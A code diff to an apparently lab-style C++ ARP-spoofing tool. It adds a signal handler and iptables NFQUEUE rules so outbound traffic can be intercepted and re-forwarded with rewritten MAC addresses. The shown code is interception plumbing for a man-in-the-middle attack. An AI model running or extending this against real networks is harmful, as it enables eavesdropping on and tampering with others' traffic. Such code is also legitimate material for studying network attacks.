@@ -2,6 +2,12 @@
 
 // #define INFO 1
 
+void handler(int signum) {
+    system("sudo iptables -t mangle -D OUTPUT -j NFQUEUE --queue-num 0");
+    exit(signum);
+}
+
+
 /*
 Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
 Change the destination MAC address of the packet to the corresponding MAC address in the map
@@ -61,12 +67,6 @@ void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t,
     uint8_t buffer[IP_MAXPACKET];
     struct sockaddr saddr;
     int saddr_len = sizeof(saddr);
-
-    int val = 1;
-    if (setsockopt(sd, SOL_SOCKET, SO_MARK, &val, sizeof(val)) < 0) {
-        perror("setsockopt() failed");
-        exit(EXIT_FAILURE);
-    }
 
     while (true) {
         // Receive packet
@@ -226,13 +226,15 @@ int main(int argc, char **argv) {
     std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
     std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
 
+    system("sudo iptables -t mangle -A OUTPUT -j NFQUEUE --queue-num 0");
+    signal(SIGINT, handler);
+
     // Start the NFQHandler
-    std::thread nfq_thread(NFQHandler);
+    NFQHandler();
 
     // Wait for threads to finish
     send_thread.join();
     receive_thread.join();
-    nfq_thread.join();
 
     // Close socket descriptor.
     close(sd);
